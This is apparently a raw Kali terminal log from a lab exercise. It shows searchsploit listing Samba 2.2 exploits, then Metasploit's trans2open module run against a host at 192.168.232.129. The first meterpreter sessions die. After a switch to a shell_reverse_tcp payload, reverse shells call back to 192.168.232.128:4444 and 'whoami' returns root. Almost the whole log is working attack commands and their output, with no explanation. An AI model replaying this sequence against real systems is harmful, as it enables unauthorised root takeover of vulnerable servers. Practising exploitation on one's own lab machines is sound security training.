(kali㉿kali)-[~]
└─$ searchsploit samba 2.2
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
Samba 2.0.x/2.2 - Arbitrary File Creation                      | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)   | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasp | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasplo | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Pri | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasp | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasplo | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Me | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution      | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)     | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)     | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)     | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)     | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)           | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                           | linux/remote/7.pl
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution              | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                          | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                  | linux_x86/dos/36741.py
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


**Exploit using metasploit** 

──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: The use command supports fuzzy searching to try and 
select the intended module, e.g., use kerberos/get_ticket or use 
kerberos forge silver ticket
                                                  

  Metasploit Park, System Security Interface                                                     
  Version 4.0.5, Alpha E                                                                         
  Ready...                                                                                       
  > access security                                                                              
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
                                                              

       =[ metasploit v6.4.112-dev                               ]
+ -- --=[ 2,607 exploits - 1,325 auxiliary - 1,710 payloads     ]
+ -- --=[ 430 post - 49 encoders - 14 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search trans2open

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank   Check  Description
   -  ----                                                         ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open                                                                                        
After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'                                                                    

msf > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp                                                        
msf exploit(linux/samba/trans2open) > options                                                                                     
                                                                                                                                  
Module options (exploit/linux/samba/trans2open):                                                                                  
                                                                                                                                  
   Name    Current Setting  Required  Description                                                                                 
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                      asploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.232.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > set rhosts 192.168.232.129
rhosts => 192.168.232.129
msf exploit(linux/samba/trans2open) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Samba 2.2.x - Bruteforce


msf exploit(linux/samba/trans2open) > exploit 
[*] Started reverse TCP handler on 192.168.232.128:4444 
[*] 192.168.232.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.232.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.232.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.232.129:139 - Trying return address 0xbffffafc...
[*] Sending stage (1062760 bytes) to 192.168.232.129
[*] 192.168.232.129 - Meterpreter session 1 closed.  Reason: Died
[*] 192.168.232.129:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1062760 bytes) to 192.168.232.129
[*] 192.168.232.129 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.232.129:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1062760 bytes) to 192.168.232.129
[*] 192.168.232.129 - Meterpreter session 3 closed.  Reason: Died
[*] 192.168.232.129:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1062760 bytes) to 192.168.232.129
[*] 192.168.232.129 - Meterpreter session 4 closed.  Reason: Died
[*] 192.168.232.129:139 - Trying return address 0xbffff6fc...
[*] 192.168.232.129:139 - Trying return address 0xbffff5fc...
[*] 192.168.232.129:139 - Trying return address 0xbffff4fc...
[*] 192.168.232.129:139 - Trying return address 0xbffff3fc...
^C[-] 192.168.232.129:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
msf exploit(linux/samba/trans2open) > 
[-] Meterpreter session 1 is not valid and will be closed
[-] Meterpreter session 2 is not valid and will be closed
[-] Meterpreter session 3 is not valid and will be closed
[-] Meterpreter session 4 is not valid and will be closed

msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.232.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                      asploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.232.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > set payload linux/x86/
set payload linux/x86/adduser                         set payload linux/x86/shell/bind_ipv6_tcp
set payload linux/x86/chmod                           set payload linux/x86/shell/bind_ipv6_tcp_uuid
set payload linux/x86/exec                            set payload linux/x86/shell/bind_nonx_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell/bind_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell/bind_tcp_uuid
set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell/reverse_ipv6_tcp
set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/shell/reverse_nonx_tcp
set payload linux/x86/meterpreter/bind_tcp_uuid       set payload linux/x86/shell/reverse_tcp
set payload linux/x86/meterpreter/reverse_ipv6_tcp    set payload linux/x86/shell/reverse_tcp_uuid
set payload linux/x86/meterpreter/reverse_nonx_tcp    set payload linux/x86/shell_bind_ipv6_tcp
set payload linux/x86/meterpreter/reverse_tcp         set payload linux/x86/shell_bind_tcp
set payload linux/x86/meterpreter/reverse_tcp_uuid    set payload linux/x86/shell_bind_tcp_random_port
set payload linux/x86/metsvc_bind_tcp                 set payload linux/x86/shell_reverse_tcp
set payload linux/x86/metsvc_reverse_tcp              set payload linux/x86/shell_reverse_tcp_ipv6
set payload linux/x86/read_file                       
msf exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(linux/samba/trans2open) > options 

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.232.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                      asploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.232.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > exploit 
[*] Started reverse TCP handler on 192.168.232.128:4444 
[*] 192.168.232.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.232.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.232.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.232.129:139 - Trying return address 0xbffffafc...
[*] 192.168.232.129:139 - Trying return address 0xbffff9fc...
[*] 192.168.232.129:139 - Trying return address 0xbffff8fc...
[*] 192.168.232.129:139 - Trying return address 0xbffff7fc...
[*] 192.168.232.129:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.232.128:4444 -> 192.168.232.129:33355) at 2026-04-30 07:01:19 -0400

[*] Command shell session 6 opened (192.168.232.128:4444 -> 192.168.232.129:33356) at 2026-04-30 07:01:21 -0400
[*] Command shell session 7 opened (192.168.232.128:4444 -> 192.168.232.129:33357) at 2026-04-30 07:01:22 -0400
[*] Command shell session 8 opened (192.168.232.128:4444 -> 192.168.232.129:33358) at 2026-04-30 07:01:23 -0400
whoami
root

msf exploit(linux/samba/trans2open) > ^C[-] 192.168.232.129:139 - Exploit failed [user-interrupt]: Interrupt 
[-] Unknown command: ^C[-]. Run the help command for more details.
msf exploit(linux/samba/trans2open) > [-] exploit: Interrupted
[-] Unknown command: [-]. Run the help command for more details.
msf exploit(linux/samba/trans2open) > 

root
